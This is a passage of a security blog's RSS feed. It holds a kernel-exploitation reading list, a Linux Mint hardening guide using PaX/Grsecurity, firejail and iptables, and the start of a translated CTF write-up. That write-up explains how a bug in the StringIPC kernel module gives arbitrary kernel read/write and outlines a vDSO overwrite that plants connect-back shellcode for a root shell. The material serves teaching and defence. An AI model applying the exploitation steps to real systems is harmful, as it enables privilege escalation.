+  &lt;li&gt;A Bug Hunter’s Diary: A Guided Tour Through the Wilds of Software Security – &lt;em&gt;Tobias Klein&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/Bug-Hunters-Diary-Software-Security/dp/1593273851&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
+  &lt;li&gt;Hacking: The Art of Exploitation, 2nd Edition – &lt;em&gt;Jon Erickson&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/Hacking-The-Art-Exploitation-Edition/dp/1593271441&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
+  &lt;li&gt;A Guide to Kernel Exploitation: Attacking the Core –  &lt;em&gt;Enrico Perla B.Sc. Computer Science University of Torino M.Sc. Computer Science Trinity College Dublin, Massimiliano Oldani&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/Guide-Kernel-Exploitation-Attacking-Core/dp/1597494860&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
+  &lt;li&gt;The Art of Software Security Assessment: Identifying and Preventing Software Vulnerabilities –  &lt;em&gt;Mark Dowd, John McDonald, Justin Schuh&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/The-Software-Security-Assessment-Vulnerabilities/dp/0321444426&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
+  &lt;li&gt;Fuzzing: Brute Force Vulnerability Discovery – &lt;em&gt;Michael Sutton, Adam Greene, Pedram Amini&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/Fuzzing-Brute-Force-Vulnerability-Discovery/dp/0321446119&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
+  &lt;li&gt;Fuzzing for Software Security Testing and Quality Assuranc – &lt;em&gt;Ari Takanen, Jared DeMott, Charlie Miller&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/Fuzzing-Software-Security-Assurance-Information/dp/1596932147&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;reference-papers&quot;&gt;-[ 4. Reference Papers&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html&quot;&gt;Intel® 64 and IA-32 Architectures Software Developer Manuals&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://phrack.org/archives/issues/64/6.txt&quot;&gt;Attacking the Core : Kernel Exploiting Notes&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://phrack.org/archives/issues/66/15.txt&quot;&gt;Linux Kernel Heap Tampering Detection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://jon.oberheide.org/blog/2010/09/10/linux-kernel-can-slub-overflow/&quot;&gt;Linux Kernel CAN SLUB Overflow&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.vsecurity.com/download/papers/slob-exploitation.pdf&quot;&gt;A Heap of Trouble: Breaking the Linux Kernel SLOB Allocator&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.fi.muni.cz/~xslaby/sklad/teze.pdf&quot;&gt;Automatic Bug-finding Techniques for Linux Kernel&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.usenix.org/legacy/events/woot11/tech/final_files/Yamaguchi.pdf&quot;&gt;Vulnerability Extrapolation: Assisted Discovery of Vulnerabilities Using Machine Learning&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html&quot;&gt;Offset2lib: bypassing full ASLR on 64bit Linux&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://crypto.stanford.edu/~blynn/rop/&quot;&gt;64-bit Linux Return-Oriented Programming&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://insecure.org/sploits/non-executable.stack.problems.html&quot;&gt;Defeating Solar Designer’s Non-executable Stack Patch Summary&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html&quot;&gt;Introduction to return oriented programming (ROP)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://phrack.org/archives/issues/58/4.txt&quot;&gt;The advanced return-into-lib(c) exploits: PaX case study&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>Wed, 20 Jan 2016 02:26:37 +0800</pubDate>
+        <link>http://www.hardenedlinux.org/system-security/2016/01/20/an-introduction-to-linux-kernel-exploitation.html</link>
+        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2016/01/20/an-introduction-to-linux-kernel-exploitation.html</guid>
+        
+        
+        <category>system-security</category>
+        
+      </item>
+    
+      <item>
+        <title>Hardening your desktop: Linux Mint with PaX/Grsecurity </title>
+        <description>&lt;p&gt;By citypw&lt;/p&gt;
+
+&lt;p&gt;–[ CONTENTS&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;About this doc&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Build and install customized kernel with PaX/Grsecurity patch&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;PaX flags: paxctl-ng &amp;amp; pax-bites&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Kernel tuning&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Networking&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Sandboxing: seccomp&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Crypto&lt;/p&gt;
+
+    &lt;p&gt;6.1 Entropy&lt;/p&gt;
+
+    &lt;p&gt;6.2 Daily bread&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;about-this-documentation&quot;&gt;–[ 0. About this documentation&lt;/h2&gt;
+&lt;p&gt;We just celebrated another new year a couple of days ago, which means it’s 2016 already. A another new year usually just brings us to another fight. FOSS is still our fortress, as always.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;People may quite excited about we are getting one step closer to the Singularity. &lt;/li&gt;
+  &lt;li&gt;People may praise about how great of technological evolution will be.&lt;/li&gt;
+  &lt;li&gt;People may just stuck in some shitty places and get drunk and going out of nowhere.&lt;/li&gt;
+  &lt;li&gt;People may……….well, it’s none of my fuc*ing business.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I just reviewed the current status of GNU/Linux distros. Sadly to say, only a few distros( Aphine, Gentoo, etc) shipped PaX/Grsecurity by default. Even worse if you take a glance at the GNU/Linux desktop field. The GUI is looking better than ever before. But the sense of security is almost like a decade ago. This is what make me ticks, to write this doc. I’m trying to show you there’s a pretty easy way to do the whole process of hardening your desktop/laptop. I choose Linux Mint 17 as exmaple for two reasons.&lt;/p&gt;
+
+&lt;p&gt;1, I’m a Linux Mint user since Linut Mint 15. I personally like MATE and I hate GNOME3;-)&lt;/p&gt;
+
+&lt;p&gt;2, Linux Mint is the highest rank GNU/Linux distro in past 5 years( at least) according to &lt;a href=&quot;http://distrowatch.com/&quot;&gt;DistroWatch&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;build-and-install-customized-kernel-with-paxgrsecurity-patch&quot;&gt;–[ 1. Build and install customized kernel with PaX/Grsecurity patch&lt;/h2&gt;
+
+&lt;p&gt;I assumed you have Linux Mint 17 installed on your laptop or PC already. The 1st thing to do is install some packages will be used in the building of PaX/Grsecurity kernel:&lt;/p&gt;
+&lt;pre&gt;
+sudo apt-get update &amp;amp;&amp;amp; sudo apt-get upgrade
+
+sudo apt-get install build-essential libncurses5-dev gcc-4.8-plugin-dev libssl-dev
+&lt;/pre&gt;
+
+&lt;p&gt;Then, download &lt;a href=&quot;https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.3.3.tar.xz&quot;&gt;linux kernel 4.3.3&lt;/a&gt; and PaX/Grsecurity &lt;a href=&quot;https://github.com/hardenedlinux/hardenedlinux_profiles/raw/master/linux-mint_desktop/grsecurity-3.1-4.3.3-201601051958.patch&quot;&gt;test patch for 4.3.3&lt;/a&gt;( note: for any commercial purpose use, I’m highly recommend you to use &lt;a href=&quot;https://grsecurity.net/announce.php&quot;&gt;PaX/Grsecurity stable patch&lt;/a&gt;). Then, you could use &lt;a href=&quot;https://github.com/hardenedlinux/hardenedlinux_profiles/raw/master/linux-mint_desktop/grsec-4.3.3-for-linux-mint-17.config&quot;&gt;my config&lt;/a&gt; to build kernel:&lt;/p&gt;
+&lt;pre&gt;
+cd kernel-src
+patch -p1 &amp;lt; ../grsecurity-patch
+cp grsec-4.3.3-for-linux-mint-17.config .config
+make -j4 deb-pkg
+&lt;/pre&gt;
+
+&lt;p&gt;Then you should see some .deb files and you can use dpkg to install your new kernel:&lt;/p&gt;
+&lt;pre&gt;
+dpkg -i *.deb
+&lt;/pre&gt;
+
+&lt;p&gt;Now you should have multiple kernel options. Comment two lines in /etc/default/grub if you want to choose which kernel to bootup:&lt;/p&gt;
+&lt;pre&gt;
+#GRUB_HIDDEN_TIMEOUT=0
+#GRUB_HIDDEN_TIMEOUT_QUIET=true
+&lt;/pre&gt;
+
+&lt;p&gt;And run:&lt;/p&gt;
+&lt;pre&gt;
+update-grub2
+&lt;/pre&gt;
+
+&lt;p&gt;Before reboot, plz make sure you install some popular applications:&lt;/p&gt;
+&lt;pre&gt;
+sudo apt-get install chromium-browser vlc firefox amarok
+&lt;/pre&gt;
+
+&lt;h2 id=&quot;pax-flags-paxctl-ng--pax-bites&quot;&gt;–[ 2. PaX flags: paxctl-ng &amp;amp; pax-bites&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://en.wikibooks.org/wiki/Grsecurity/Appendix/PaX_Flags&quot;&gt;PaX flags&lt;/a&gt; is provided by PaX/Grsecurity to tell the kernel which mitigations should be used in the specific binary. More flags are enabled, more security you gains. But some binaries doesn’t work with some PaX flags, e.g: JIT can’t work with MPROTECT. For the sake of making PaX/Grsecurity work with Linux Mint, we’ll have to disable some mitigations in some binaries. I wrote a tool is called &lt;a href=&quot;https://github.com/hardenedlinux/pax-bites&quot;&gt;pax-bites&lt;/a&gt;, which utilize paxctl-ng to add/delete PaX flags. The config file of pax-bites is very easy to write. The format is like this:&lt;/p&gt;
+&lt;pre&gt;
+file_path;flags
+&lt;/pre&gt;
+
+&lt;p&gt;For example, I’m using &lt;a href=&quot;https://github.com/hardenedlinux/hardenedlinux_profiles/raw/master/linux-mint_desktop/pax_flags_mint17.config&quot;&gt;this config&lt;/a&gt;:&lt;/p&gt;
+&lt;pre&gt;
+cat pax_flags_mint17.config 
+/usr/lib/jvm/java-7-openjdk-amd64/jre/bin/java;m
+/usr/bin/python2.7;m
+/usr/bin/python3.4;m
+/usr/lib/mdm/mdmwebkit;m
+/usr/lib/firefox/firefox;m
+/usr/lib/firefox/plugin-container;m
+/usr/lib/thunderbird/thunderbird;m
+/usr/lib/chromium-browser/chromium-browser;m
+/usr/bin/amarok;m
+/usr/bin/pulseaudio;m
+&lt;/pre&gt;
+
+&lt;p&gt;The very limited number of applications on Linut Mint GNU/Linux have been tested by us( I and other members of Hardenedlinux community). If you find some applications won’t work correctly caused by PaX flags, you can write your own config( plz let us know) or just file a bug by our &lt;a href=&quot;https://github.com/hardenedlinux/hardenedlinux_profiles&quot;&gt;github repo&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;kernel-tuning&quot;&gt;–[ 3. Kernel tuning&lt;/h2&gt;
+
+&lt;p&gt;The current &lt;a href=&quot;https://github.com/hardenedlinux/hardenedlinux_profiles/raw/master/linux-mint_desktop/sysctl.conf&quot;&gt;sysctl.conf&lt;/a&gt;. We will do more work on this. Any detail about security-related kernel tuning, you might want to check &lt;a href=&quot;http://hardenedlinux.org/system-security/2015/06/09/debian-security-chklist.html&quot;&gt;Debian security checklist&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;networking&quot;&gt;–[ 4. Networking&lt;/h2&gt;
+
+&lt;p&gt;Iptables is a eay-to-use stateful firewall. It’s very important to let your desktop/laptop have it. &lt;a href=&quot;https://github.com/hardenedlinux/hardenedlinux_profiles/blob/master/linux-mint_desktop/iptables_mint17.sh&quot;&gt;Some policies&lt;/a&gt; has been tested. You can use it directly. Any feedback or improvement are always welcome.&lt;/p&gt;
+
+&lt;p&gt;You might be interested in &lt;a href=&quot;https://raw.githubusercontent.com/citypw/DNFWAH/master/2/d2_0x06_Hacking_the_wholism_of_linux_net.txt&quot;&gt;how iptables/netfilter works&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;sandbox-seccomp-bpf-based-implementation&quot;&gt;–[ 5. Sandbox: Seccomp-bpf based implementation&lt;/h2&gt;
+
+&lt;p&gt;The sandboxing technolog has a very long history of evolution journey in past decades. Here we’re just going through &lt;a href=&quot;http://ekoparty.org/archive/2013/charlas/Sandboxing%20Linux%20code%20to%20mitigate%20exploitation%20%28Or-%20How%20to%20ship%20a%20secure%20operating%20system%20that%20includes%20third-party%20code%29.pdf&quot;&gt;Seccomp based implementation&lt;/a&gt;. &lt;a href=&quot;https://wiki.mozilla.org/Security/Sandbox/Seccomp&quot;&gt;Seccomp&lt;/a&gt; is being merged into vanilla kernel since 2.6.12. Seccomp can not support complicated task because it whitelisted a few system calls for computing-only task. Anyway, it’s not what we talk about here. We only care about Seccomp’s extension: &lt;a href=&quot;https://www.kernel.org/doc/Documentation/prctl/seccomp_filter.txt&quot;&gt;Seccomp-bpf&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;There are two approaches to sandboxing the application you choose:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;You can add Seccomp-bpf polices into the application by tweaking the polices via prctl(). IMOHO, it’s quite like pledge() system call in latest OpenBSD. Here’s &lt;a href=&quot;https://outflux.net/teach-seccomp/&quot;&gt;some examples&lt;/a&gt; from Kees Cook( Yeah, that Kees who helped out to brings the real sense of security into kernel upstream;-))&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Use a external wrapper program to exec the application with Seccomp-bpf filtering polices.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The 1st approach is developer-only. Because you’ll have to modify the source code add those polices into it. Otherwise, I don’t think this gonna happen in GNU/Linux community. OpenBSD community are trying add &lt;a href=&quot;http://www.openbsd.org/cgi-bin/man.cgi/OpenBSD-current/man2/pledge.2&quot;&gt;pledge()&lt;/a&gt; into diverse applications but…the people who cares about security from OpenBSD community were called “&lt;a href=&quot;http://article.gmane.org/gmane.linux.kernel/706950&quot;&gt;bunch of masturbating monkeys&lt;/a&gt;” by Linus Torvalds….&lt;/p&gt;
+
+&lt;p&gt;The 2nd approach seems quite flexible. Here are two options:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://github.com/thestinger/playpen&quot;&gt;Playpen&lt;/a&gt;, developed by Daniel Micay.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://firejail.wordpress.com/&quot;&gt;Firejail&lt;/a&gt;, developed/maintained by a group of people.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I choose firejail, because the community provides a bunch of sandboxing polices for &lt;a href=&quot;http://forums.linuxmint.com/viewtopic.php?f=42&amp;amp;t=202735&quot;&gt;some popular applications&lt;/a&gt;( firefox, vlc, chromium, etc). It’s almost like off-the-shell stuff. You can download the latest version of &lt;a href=&quot;http://sourceforge.net/projects/firejail/files/firejail/&quot;&gt;firejail&lt;/a&gt; and install it by package or compile it from source code. Note that the default Seccomp-bpf policies doesn’t have any system call whitelists, which mean it is a sandbox without filtering any syscalls basically. So &lt;a href=&quot;https://l3net.wordpress.com/2015/04/13/firejail-seccomp-guide/&quot;&gt;write your own one&lt;/a&gt; if you want.&lt;/p&gt;
+
+&lt;h2 id=&quot;crypto&quot;&gt;–[ 6. Crypto&lt;/h2&gt;
+
+&lt;p&gt;Crypto engineering has been playing a very important role in past decade. System security &amp;amp; crypto engineering are like twins. One can’t live without another. Use crypto without system hardening is like building your infrastructre on sand. Only hardening the system without using crypto is like archer’s holding a fancy Elf silver-bow but doesn’t have any arrows at all. Don’t forget the goal of infosec is to protect the fuc*ing information in 3 basic dimensions: C(onfidentiality), I(ntegrity) and A(vailability).&lt;/p&gt;
+
+&lt;h2 id=&quot;entropy&quot;&gt;—-[ 6.1 Entropy&lt;/h2&gt;
+
+&lt;p&gt;Entropy is matter to private/session keys. It’d be a big deal if you’re using GNU/Linux as server. Desktop won’t be have much trouble about it. PaX/Grsecurity increased entropy for the kernel somehow. You may still want to install a daemon to ensuring the system always has enough entrop. Let the cryptographers worries about blocking/non-blocking issues on &lt;a href=&quot;http://www.2uo.de/myths-about-urandom/&quot;&gt;random/urandom&lt;/a&gt;. All you need to know is &lt;a href=&quot;http://www.issihosts.com/haveged/history.html&quot;&gt;Haveged&lt;/a&gt; will be very helpful to your server/desktop. You can &lt;a href=&quot;https://www.digitalocean.com/community/tutorials/how-to-setup-additional-entropy-for-cloud-servers-using-haveged&quot;&gt;install it via&lt;/a&gt;:&lt;/p&gt;
+
+&lt;pre&gt;
+Installing haveged on Debian/Ubuntu
+
+You can easily install haveged on Debian and Ubuntu by running the following command:
+
+# apt-get install haveged
+
+Should this package not be available in your default repositories, you will need to compile from source (see below)
+
+Once you have the package installed, you can simply edit the configuration file located in /etc/default/haveged, ensuring the following options are set (usually already the default options):
+
+DAEMON_ARGS=&quot;-w 1024&quot;
+
+Finally, just make sure it&#39;s configured to start on boot:
+
+# update-rc.d haveged defaults
+&lt;/pre&gt;
+
+&lt;h2 id=&quot;daily-bread&quot;&gt;—-[ 6.2 Daily bread&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://pidgin.im/&quot;&gt;Pidgin&lt;/a&gt; + OTR&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;
+sudo apt-get install pidgin pidgin-otr
+&lt;/pre&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.torproject.org/&quot;&gt;Tor broswer&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;It can bring you anonymity. Download it &lt;a href=&quot;https://www.torproject.org/download/download-easy.html.en&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.gnupg.org/&quot;&gt;GnuPG&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Encryption/Decryption email with GPG is not a bad idea. You may also want to try &lt;a href=&quot;https://github.com/stealth/opmsg&quot;&gt;opmsg&lt;/a&gt;.&lt;/p&gt;
+</description>
+        <pubDate>Sun, 10 Jan 2016 11:54:45 +0800</pubDate>
+        <link>http://www.hardenedlinux.org/system-security/2016/01/10/hardening-your-desktop-linux-mint-with-grsec.html</link>
+        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2016/01/10/hardening-your-desktop-linux-mint-with-grsec.html</guid>
+        
+        
+        <category>system-security</category>
+        
+      </item>
+    
+      <item>
+        <title>Bypassing SMEP Using vDSO Overwrites(使用vDSO重写来绕过SMEP防护)</title>
+        <description>&lt;p&gt;Shawn: Intel的SMEP( Sandybridge加入）和SMAP（本来应该是Haswell加入，最终推迟到了broadwell时才加入）中SMEP已经大规模的部署到了生产环境中，由于一些媒体的误导，企业和个人都对SMEP有着过高的期望，斯拉夫兵工厂至少在13个月以前就有针对SMEP绕过的weaponized exploit，这次itszn的绕过SMEP防护的实现非常的精彩，直接把SMEP绕过打成了“白菜价”，而另外一方面，经过h4rdenedzer0的研究和测试发现，虽然PaX/Grsecurity中的类似USERCOPY可以轻松防御这种绕过，但更有意思的是没有任何防御feature的情况下仅靠代码级别的调整也能启到security through obscurity的作用，至少可以防止massive exploit的通杀。这个case值得关注的点还是在于单点防御是无效的，系统层的加固必须以纵深防御的思路来做，多个mitigation feature+代码级加固会让兵工厂也很蛋疼，当然另外一方面bypass难度提升了他们的利润也会上升;-)&lt;/p&gt;
+
+&lt;p&gt;原文地址 &lt;a href=&quot;http://itszn.com/blog/?p=21&quot;&gt;Bypassing SMEP Using vDSO Overwrites&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;译者：n3o4po11o&lt;/p&gt;
+
+&lt;p&gt;在今年的CSAW(Cyber Security Awareness Week)决赛中有几个内核相关的挑战。下文是关于我解决题名为”StringIPC”的思路。(作者为&lt;a href=&quot;https://twitter.com/mncoppola&quot;&gt;Michael Coppola&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;摆在我们面前的机器为一台64位ubuntu 14.04.3运行了3.13版本的内核并开启SMEP，kptr_restrict，demsg_restrict的虚拟机。内核中加载了名为”StringIPC”的内核模块，但在home目录中提供了该模块的源码。你可以在&lt;a href=&quot;https://github.com/mncoppola/StringIPC/blob/master/main.c&quot;&gt;这里&lt;/a&gt;找到源码，我也会在下文中展示一些重要的部分。&lt;/p&gt;
+
+&lt;h2 id=&quot;section&quot;&gt;分析内核模块&lt;/h2&gt;
+
+&lt;p&gt;StringIPC模块实现了最基本的进程间通信的功能，允许对位于/dev/csaw的设备在不同通道下进行读写数据的操作。有8个控制码（codes）可以用来对通道进行创建，修改和读写数据。&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;#define CSAW_IOCTL_BASE     0x77617363
+#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
+#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
+#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
+#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
+#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
+#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
+#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
+#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;CSAW_ALLOC_CHANNEL允许用户创建一个新通道和根据给定的大小创建一个新缓冲区，CSAW_GROW_CHANNEL和CSAW_SHRINK_CHANNEL使用了krealloc来改变通道的缓冲区大小。CSAW_READ_CHANNEL和CSAW_WRITE_CHANNEL用来读取和写入由CSAW_SEEK_CHANNEL所指向的当前通道的内存数据。最后CSAW_OPEN_CHANNEL和CSAW_CLOSE_CHANNEL用来确定当前与ioctl进行交互的通道。&lt;/p&gt;
+
+&lt;p&gt;Bug存在于使用了krealloc的realloc_ipc_channel:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;static int realloc_ipc_channel ( struct ipc_state *state, int id, size_t size, int grow )
+{
+    struct ipc_channel *channel;
+    size_t new_size;
+    char *new_data;
+
+    channel = get_channel_by_id(state, id);
+    if ( IS_ERR(channel) )
+        return PTR_ERR(channel);
+
+    if ( grow )
+        new_size = channel-&amp;gt;buf_size + size;
+    else
+        new_size = channel-&amp;gt;buf_size - size;
+
+    new_data = krealloc(channel-&amp;gt;data, new_size + 1, GFP_KERNEL);
+    if ( new_data == NULL )
+        return -EINVAL;
+
+    channel-&amp;gt;data = new_data;
+    channel-&amp;gt;buf_size = new_size;
+
+    ipc_channel_put(state, channel);
+
+    return 0;
+}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;当我们试图缩小通道缓冲区的大小时，我们缩小了一个比原来缓冲区大小还大1的值，此时new_size会发生underflow从而变成了INT_MAX。当krealloc调用时new_size+1，接着发生overflow回到了0。从krealloc的源码可以看出，当new_size为0时，返回一个ZERO_SIZE_PTR：&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;void *krealloc(const void *p, size_t new_size, gfp_t flags) {
+    void *ret;
+
+    if (unlikely(!new_size)) {
+         kfree(p);
+         return ZERO_SIZE_PTR;
+    }
+...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;ZERO_SIZE_PTR定义为((void *)16)。当我们重新调整大小后，channel-&amp;gt;data=0x10而channel_buf_size=INT_MAX。通过在0x10处获取偏移量，我们可以在内核空间(kernelspace)实现任意读写。&lt;/p&gt;
+
+&lt;h2 id=&quot;section-1&quot;&gt;任意写利用&lt;/h2&gt;
+
+&lt;p&gt;既然我们可以任意读写，我们可以开始创建exploit。由于此时SMEP开启，我们不能直接覆盖一些数据然后跳转到用户空间(userspace)去执行已经提前准备好的shellcode。为了绕过SMEP我们可以使用一个覆盖vDSO的技术，来让另外一个进程以root权限运行进而运行我们反弹（conncet-back）shellcode。&lt;/p&gt;
+
+&lt;p&gt;整体的思路如下：vDSO同时映射在内核空间以及每一个进程的虚拟内存中，包括那些以root权限运行的进程。通过调用那些不需要上下文切换（context switching）的系统调用可以加快这一步骤(定位vDSO)。vDSO在用户空间(userspace)映射为R/X，而在内核空间(kernelspace)则为R/W。这允许我们在内核空间修改它，接着在用户空间执行。&lt;/p&gt;
+
+&lt;p&gt;下面是使用这个技术的步骤：&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;1.实现任意读写
+2.在内核空间定位vDSO
+3.为root权限运行的进程创建反弹shellcode
+4.用shellcode覆盖部分vDSO
+5.监听反弹root shell&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;在我们利用StringIPC模块时，我们已经能够任意读写内存了，所以下一步我们将在runtime定位vDSO.&lt;/p&gt;
+
+&lt;h2 id=&quot;locating-vdso&quot;&gt;Locating vDSO&lt;/h2&gt;
+
+&lt;p&gt;下面是内核代码中用于在内核空间初始化vDSO页的代码段：&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;static int __init init_vdso_vars(void) {
+    int npages = (vdso_end - vdso_start + PAGE_SIZE - 1) / PAGE_SIZE;
+    int i;
+    char *vbase;
+    vdso_size = npages &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt; PAGE_SHIFT&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;vdso_pages =&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;kmalloc(sizeof(struct&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;page&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;*)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;npages&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;vdso_pages&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;oom&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;i =&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;npages&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;page&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;p =&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;alloc_page(GFP_KERNEL);&lt;/span&gt;
